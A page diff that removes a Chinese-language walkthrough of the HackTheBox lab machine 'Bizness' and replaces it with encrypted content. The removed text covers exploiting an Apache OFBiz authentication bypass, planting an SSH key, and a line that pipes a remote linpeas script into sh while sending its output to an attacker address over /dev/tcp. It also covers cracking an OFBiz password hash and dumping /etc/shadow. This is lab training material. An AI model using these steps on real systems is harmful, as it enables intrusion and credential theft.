@@ -22,7 +22,7 @@
     
     
       
-        <title>Bizness - Write-up</title>
+        <title>[Protected] Bizness - Write-up</title>
       
     
     
@@ -97,7 +97,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Bizness
+              [Protected] Bizness
             
           </span>
         </div>
@@ -602,7 +602,7 @@
           
   
   <span class="md-ellipsis">
-    Bizness
+    [Protected] Bizness
   </span>
   
 
@@ -613,7 +613,7 @@
         
   
   <span class="md-ellipsis">
-    Bizness
+    [Protected] Bizness
   </span>
   
 
@@ -1005,135 +1005,34 @@
   
 
 
-<h1 id="bizness">Bizness</h1>
-<p><img alt="" src="../assets/Bizness.png" /></p>
-<h2 id="recon">Recon</h2>
-<ul>
-<li><code>nmap -sC -A -p- --min-rate 1000 -T4 10.10.11.252</code>
-<div class="language-shell highlight"><pre><span></span><code>PORT<span class="w">      </span>STATE<span class="w"> </span>SERVICE<span class="w">    </span>VERSION
-<span class="m">22</span>/tcp<span class="w">    </span>open<span class="w">  </span>ssh<span class="w">        </span>OpenSSH<span class="w"> </span><span class="m">8</span>.4p1<span class="w"> </span>Debian<span class="w"> </span><span class="m">5</span>+deb11u3<span class="w"> </span><span class="o">(</span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
-<span class="p">|</span><span class="w"> </span>ssh-hostkey:<span class="w"> </span>
-<span class="p">|</span><span class="w">   </span><span class="m">3072</span><span class="w"> </span>3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
-<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span><span class="m">39</span>:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
-<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
-<span class="m">80</span>/tcp<span class="w">    </span>open<span class="w">  </span>http<span class="w">       </span>nginx<span class="w"> </span><span class="m">1</span>.18.0
-<span class="p">|</span>_http-title:<span class="w"> </span>Did<span class="w"> </span>not<span class="w"> </span>follow<span class="w"> </span>redirect<span class="w"> </span>to<span class="w"> </span>https://bizness.htb/
-<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0
-<span class="m">443</span>/tcp<span class="w">   </span>open<span class="w">  </span>ssl/http<span class="w">   </span>nginx<span class="w"> </span><span class="m">1</span>.18.0
-<span class="p">|</span><span class="w"> </span>ssl-cert:<span class="w"> </span>Subject:<span class="w"> </span><span class="nv">organizationName</span><span class="o">=</span>Internet<span class="w"> </span>Widgits<span class="w"> </span>Pty<span class="w"> </span>Ltd/stateOrProvinceName<span class="o">=</span>Some-State/countryName<span class="o">=</span>UK
-<span class="p">|</span><span class="w"> </span>Not<span class="w"> </span>valid<span class="w"> </span>before:<span class="w"> </span><span class="m">2023</span>-12-14T20:03:40
-<span class="p">|</span>_Not<span class="w"> </span>valid<span class="w"> </span>after:<span class="w">  </span><span class="m">2328</span>-11-10T20:03:40
-<span class="p">|</span>_http-title:<span class="w"> </span>Did<span class="w"> </span>not<span class="w"> </span>follow<span class="w"> </span>redirect<span class="w"> </span>to<span class="w"> </span>https://bizness.htb/
-<span class="p">|</span><span class="w"> </span>tls-alpn:<span class="w"> </span>
-<span class="p">|</span>_<span class="w">  </span>http/1.1
-<span class="p">|</span>_http-server-header:<span class="w"> </span>nginx/1.18.0
-<span class="p">|</span>_ssl-date:<span class="w"> </span>TLS<span class="w"> </span>randomness<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>represent<span class="w"> </span><span class="nb">time</span>
-<span class="p">|</span><span class="w"> </span>tls-nextprotoneg:<span class="w"> </span>
-<span class="p">|</span>_<span class="w">  </span>http/1.1
-<span class="m">45597</span>/tcp<span class="w"> </span>open<span class="w">  </span>tcpwrapped
-Warning:<span class="w"> </span>OSScan<span class="w"> </span>results<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>unreliable<span class="w"> </span>because<span class="w"> </span>we<span class="w"> </span>could<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>at<span class="w"> </span>least<span class="w"> </span><span class="m">1</span><span class="w"> </span>open<span class="w"> </span>and<span class="w"> </span><span class="m">1</span><span class="w"> </span>closed<span class="w"> </span>port
-Aggressive<span class="w"> </span>OS<span class="w"> </span>guesses:<span class="w"> </span>Linux<span class="w"> </span><span class="m">4</span>.15<span class="w"> </span>-<span class="w"> </span><span class="m">5</span>.8<span class="w"> </span><span class="o">(</span><span class="m">96</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.3<span class="w"> </span>-<span class="w"> </span><span class="m">5</span>.4<span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">2</span>.6.32<span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.0<span class="w"> </span>-<span class="w"> </span><span class="m">5</span>.5<span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.1<span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.2<span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>AXIS<span class="w"> </span>210A<span class="w"> </span>or<span class="w"> </span><span class="m">211</span><span class="w"> </span>Network<span class="w"> </span>Camera<span class="w"> </span><span class="o">(</span>Linux<span class="w"> </span><span class="m">2</span>.6.17<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">95</span>%<span class="o">)</span>,<span class="w"> </span>ASUS<span class="w"> </span>RT-N56U<span class="w"> </span>WAP<span class="w"> </span><span class="o">(</span>Linux<span class="w"> </span><span class="m">3</span>.4<span class="o">)</span><span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">3</span>.16<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>,<span class="w"> </span>Linux<span class="w"> </span><span class="m">5</span>.0<span class="w"> </span>-<span class="w"> </span><span class="m">5</span>.4<span class="w"> </span><span class="o">(</span><span class="m">93</span>%<span class="o">)</span>
-No<span class="w"> </span>exact<span class="w"> </span>OS<span class="w"> </span>matches<span class="w"> </span><span class="k">for</span><span class="w"> </span>host<span class="w"> </span><span class="o">(</span><span class="nb">test</span><span class="w"> </span>conditions<span class="w"> </span>non-ideal<span class="o">)</span>.
-Network<span class="w"> </span>Distance:<span class="w"> </span><span class="m">2</span><span class="w"> </span>hops
-Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
-</code></pre></div></li>
-<li>Web 80/443
-添加域名 bizness.htb，访问 Web 页面，在主页最下方发现 <code>Apache OFBiz</code>
-<img alt="" src="../assets/Pasted%20image%2020240108081951.png" />
-访问 <code>Apache OFBiz</code> 路径，得到版本号 <code>18.12</code>
-<img alt="" src="../assets/Pasted%20image%2020240108082642.png" /></li>
-</ul>
-<h2 id="shell-as-user-ofbiz">Shell as User - ofbiz</h2>
-<h3 id="cve-2023-49070-and-cve-2023-51467">CVE-2023-49070 and CVE-2023-51467`</h3>
-<p>发现最近出现的漏洞，尝试利用
-<img alt="" src="../assets/Pasted%20image%2020240108082952.png" /></p>
-<blockquote>
-<p>https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass
-- 首先确定 jdk 版本，Linux 需要 openjdk11 <code>sudo apt install openjdk-11-jdk</code>
-<img alt="" src="../assets/Pasted%20image%2020240108083332.png" />
-- 管道符似乎会失效，可以命令分段执行，也可以通过 nc 反弹
-<img alt="" src="../assets/Pasted%20image%2020240108084158.png" />
-- 添加公钥，ssh 访问
-<div class="language-shell highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;[Public key]&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.ssh/authorized_keys
-</code></pre></div></p>
-</blockquote>
-<h2 id="shell-as-root">Shell as Root</h2>
-<ul>
-<li>跑一下 Linpeas
-<div class="language-shell highlight"><pre><span></span><code>curl<span class="w"> </span>http://10.10.16.2/linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>sh<span class="w"> </span>&gt;<span class="w"> </span>/dev/tcp/10.10.16.2/2233
-</code></pre></div></li>
-<li>发现可写入服务
-<img alt="" src="../assets/Pasted%20image%2020240108085127.png" />
-但是对应的进程运行用户是 ofbiz，暂时忽略</li>
-<li>发现 Capabilities
-<img alt="" src="../assets/Pasted%20image%2020240108085547.png" />
-尝试利用 - 失败（可能是我太菜了）
-<img alt="" src="../assets/Pasted%20image%2020240108085528.png" /></li>
-<li>尝试 sudo 权限，提示需要密码
-<img alt="" src="../assets/Pasted%20image%2020240108085705.png" />
-ofbiz 页面需要登陆，尝试寻找 ofbiz 连接的数据库以及密码，发现 derby 数据库
-<img alt="" src="../assets/Pasted%20image%2020240108085901.png" /></li>
-<li>查找关键词 <code>find / -name '*derby*' 2&gt;/dev/null</code>
-<img alt="" src="../assets/Pasted%20image%2020240108090006.png" />
-在 <code>/opt/ofbiz/runtime/data/</code> 路径查找密码
-<div class="language-text highlight"><pre><span></span><code>grep -onr &#39;assw&#39; |                           # 找到包含 assw 的文件
-awk -F &#39;:&#39; &#39;{print $1}&#39; |                    # 提取文件名
-sort -u |                                    # 去重
-while read line; do strings $line; done |    # 打印所有文件的可打印字符
-grep assw -C 1                               # 打印字符串中包含 assw 的上下文
-</code></pre></div>
-最终发现一个疑似密码 Hash 的东西 <code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code>
-<img alt="" src="../assets/Pasted%20image%2020240108091123.png" /></li>
-<li>查看 ofbiz 源代码<blockquote>
-<p>https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java#L143</p>
-</blockquote>
-</li>
-</ul>
-<p><img alt="" src="../assets/Pasted%20image%2020240108091405.png" />
-发现 Hash 的格式为 <code>$[Hash类型]$[盐]$[Hash的base64-Url]编码</code>
-因此首先将 base64 编码后的内容转化为 Hash 值，后再和盐一起尝试爆破
-<img alt="" src="../assets/Pasted%20image%2020240108091725.png" />
-- 得到的 Hash
-<div class="language-text highlight"><pre><span></span><code>b8fd3f41a541a435857a8f3e751cc3a91c174362:d
-</code></pre></div>
-- 结合实际情况，使用 hashcat 110 和 120 模式尝试爆破
-<img alt="" src="../assets/Pasted%20image%2020240108091917.png" />
-得到密码
-<img alt="" src="../assets/Pasted%20image%2020240108091957.png" />
-- 尝试执行 sudo - 密码错误，尝试登录 root 成功
-<img alt="" src="../assets/Pasted%20image%2020240108092133.png" /></p>
-<h2 id="dump-hash">Dump Hash</h2>
-<ul>
-<li><code>cat /etc/shadow</code>
-<div class="language-text highlight"><pre><span></span><code>root:$y$j9T$pJW9XfkWvA4ozHorBy1kA1$MMNByIaVvdq4YrIpvYDEIfckbiKog11HxKcxJkAZLcA:19709:0:99999:7:::
-daemon:*:19668:0:99999:7:::
-bin:*:19668:0:99999:7:::
-sys:*:19668:0:99999:7:::
-sync:*:19668:0:99999:7:::
-games:*:19668:0:99999:7:::
-man:*:19668:0:99999:7:::
-lp:*:19668:0:99999:7:::
-mail:*:19668:0:99999:7:::
-news:*:19668:0:99999:7:::
-uucp:*:19668:0:99999:7:::
-proxy:*:19668:0:99999:7:::
-www-data:*:19668:0:99999:7:::
-backup:*:19668:0:99999:7:::
-list:*:19668:0:99999:7:::
-irc:*:19668:0:99999:7:::
-gnats:*:19668:0:99999:7:::
-nobody:*:19668:0:99999:7:::
-_apt:*:19668:0:99999:7:::
-systemd-network:*:19668:0:99999:7:::
-systemd-resolve:*:19668:0:99999:7:::
-messagebus:*:19668:0:99999:7:::
-systemd-timesync:*:19668:0:99999:7:::
-sshd:*:19668:0:99999:7:::
-systemd-coredump:!*:19668::::::
-ofbiz:$y$j9T$0io/BiTgsGfXITtrQxine1$0PO2rHmI9H46z/uQszVpMm1V7UTYvB5lVh8.Vcx/Nt/:19709:0:99999:7:::
-_laurel:!:19711::::::
-</code></pre></div></li>
-</ul>
+<div id="mkdocs-encrypted-content" style="display:none">wgKvmfa91mPcpF7ZfgeAhA==;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